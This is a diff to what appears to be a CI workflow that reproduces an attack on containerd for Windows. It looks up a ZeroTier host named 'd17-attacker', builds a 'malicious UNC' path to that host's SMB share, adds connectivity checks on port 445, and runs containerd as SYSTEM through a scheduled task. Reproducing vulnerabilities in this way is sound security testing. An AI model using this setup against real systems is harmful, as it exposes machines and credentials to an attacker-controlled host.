@@ -43,12 +43,16 @@ jobs:
           # find attacker IP from ZT API
           $attackerIp=''
           $members=Invoke-RestMethod -Uri "https://api.zerotier.com/api/v1/network/$net/member" -Headers $h -TimeoutSec 20
-          foreach ($m in $members) {
-            if ($m.name -eq 'd17-attacker' -and $m.config.ipAssignments.Count -gt 0) { $attackerIp=$m.config.ipAssignments[0] }
-          }
+          $latest = $members | Where-Object { $_.name -eq 'd17-attacker' -and $_.config.ipAssignments.Count -gt 0 } | Sort-Object lastSeen -Descending | Select-Object -First 1
+          if ($latest) { $attackerIp=$latest.config.ipAssignments[0] }
           Write-Output "ATTACKER_ZTIP=$attackerIp"
           if (-not $attackerIp) { Write-Output 'NO_ATTACKER_IP'; exit 1 }
           $unc = "\\$attackerIp\SHARE"
+          Write-Output "=== connectivity diag ==="
+          ping -n 3 $attackerIp 2>&1 | Select-Object -Last 6
+          $tnc = Test-NetConnection -ComputerName $attackerIp -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue
+          Write-Output "PORT445_REACHABLE=$tnc"
+          route print 10.244 2>&1 | Select-Object -Last 8
           Write-Output "=== malicious UNC label: $unc ==="
           $act=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
           $prin=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
